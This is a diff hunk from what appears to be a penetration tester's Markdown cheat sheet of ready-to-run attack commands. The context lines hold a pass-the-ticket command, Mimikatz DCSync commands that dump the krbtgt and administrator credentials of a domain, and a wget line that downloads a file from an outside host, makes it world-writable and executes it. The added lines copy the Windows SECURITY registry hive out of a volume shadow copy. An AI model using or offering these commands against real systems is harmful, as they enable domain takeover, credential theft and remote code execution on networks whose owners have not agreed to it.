@@ -485,6 +485,11 @@ c:\windows\tasks\or.exe ptt /ticket:THETIX
 c:\windows\tasks\m.exe "privilege::debug" "lsadump::dcsync /domain:prod.corp1.com /user:prod\krbtgt" "exit"
 c:\windows\tasks\m.exe "privilege::debug" "lsadump::dcsync /domain:prod.corp1.com /user:prod\administrator" "exit"
 ```
+windows privesc - samdump
+```
+icacls C:\Windows\System32\config\Security
+extrac32 /c /y \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\Security .\Security.txt
+```
 wrap
 ```
 wget http://192.168.49.80/wrap.txt -O /tmp/Fluzaspecialties.txt;chmod 777 /tmp/Fluzaspecialties.txt;/tmp/Fluzaspecialties.txt
